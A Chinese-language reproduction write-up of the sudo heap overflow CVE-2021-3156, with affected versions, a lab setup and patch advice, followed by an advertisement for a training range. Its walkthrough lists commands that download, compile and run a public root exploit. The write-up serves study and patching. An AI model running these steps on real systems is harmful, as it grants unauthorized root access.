# **0x00简介**

sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt、reboot、su等等。这样不仅减少了root用户的登录
和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。

#  **0x01漏洞概述**

2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron
Samedit”），可导致本地权限提升。

当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。

#  **0x02影响范围**

sudo 1.8.2 - 1.8.31p2

sudo 1.9.0 - 1.9.5p1

#  **0x03环境搭建**

本次环境使用ubuntu19.04版本

1、官方下载地址：http://old-releases.ubuntu.com/releases/19.04/

![1612408344_601b6618bc8337741a880.png!small](https://image.3001.net/images/20210204/1612408344_601b6618bc8337741a880.png!small)

2、使用Vmware虚拟机安装最小安装即可。（具体安装过程自行百度）

![1612408349_601b661d63fca0a835176.png!small](https://image.3001.net/images/20210204/1612408349_601b661d63fca0a835176.png!small)

#  **0x04漏洞复现**

1、在终端输入sudo –version查看sudo版本，使用whoami查看当前用户

![1612408353_601b6621d29fd0870d80b.png!small](https://image.3001.net/images/20210204/1612408353_601b6621d29fd0870d80b.png!small)

![1612408356_601b6624e5f390710fc38.png!small](https://image.3001.net/images/20210204/1612408356_601b6624e5f390710fc38.png!small)

2、使用GitHub上的exp进行漏洞利用，使用wget或git进行下载

wget https://hub.fastgit.org/blasty/CVE-2021-3156/archive/main.zip

unzip main.zip

![1612408359_601b6627a1e2d83d2996c.png!small](https://image.3001.net/images/20210204/1612408359_601b6627a1e2d83d2996c.png!small)

![1612408364_601b662c35bdbab7ae93e.png!small](https://image.3001.net/images/20210204/1612408364_601b662c35bdbab7ae93e.png!small)

3、进入解压的目录，使用make编译成可执行文件

cd CVE-2021-3156-main/

make

![1612408366_601b662eca7997a7c6af9.png!small](https://image.3001.net/images/20210204/1612408366_601b662eca7997a7c6af9.png!small)

4、执行编译出来的文件后面加上ubuntu执行可以看到已经是root权限了（使用Debian的系统也可以）

./sudo-hax-me-a-sandwich ubuntu

![1612408371_601b663319a70ab4065eb.png!small](https://image.3001.net/images/20210204/1612408371_601b663319a70ab4065eb.png!small)

#  **0x05修复建议**

目前官方已在sudo新版本1.9.5p2中修复了该漏洞，请受影响的用户尽快升级版本进行防护。

下载地址：https://www.sudo.ws/download.html

![1612408374_601b66360b5bf1d2c90f5.png!small](https://image.3001.net/images/20210204/1612408374_601b66360b5bf1d2c90f5.png!small)

在这里，给大家介绍一下“东塔攻防世界靶场”

2020年12月，东塔攻防世界靶场正式对外提供注册，各位小伙伴可通过注册后进行体验。新注册用户可获得一定的积分，对于靶场使用获取正确的Key后，也可以获取一定的经验值，经验值根据排名会不定期给予一定的奖励。

并且，在操作过程中，针对出现的Bug和安全漏洞问题可以和塔塔子提出，审核通过后可以获得相应的奖励积分。

东塔攻防世界网站不定时推出可免费限时使用的靶场，具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服了解详情。

东塔攻防世界靶场主要分为在线靶场和职业体系两大特色板块。且平台内的靶场会定期更新内容，尤其是最新漏洞复现的一些文章和靶场，会优先在靶场中提供环境让大家体验。

东塔攻防世界网站会不定期限时免费推出最新的一些复现的靶场，以供学习交流，给了大家充分体验和使用靶场的机会。

具体可关注东塔网络安全学院推出的一系列活动或添加东塔客服wx（dongtakefu）了解详情。

除了以上介绍的内容，还有更多宝藏区域，更强大的功能，等你来寻宝！

详戳下方“东塔攻防世界靶场”网址，Get一波新世界

https://labs.do-ta.com

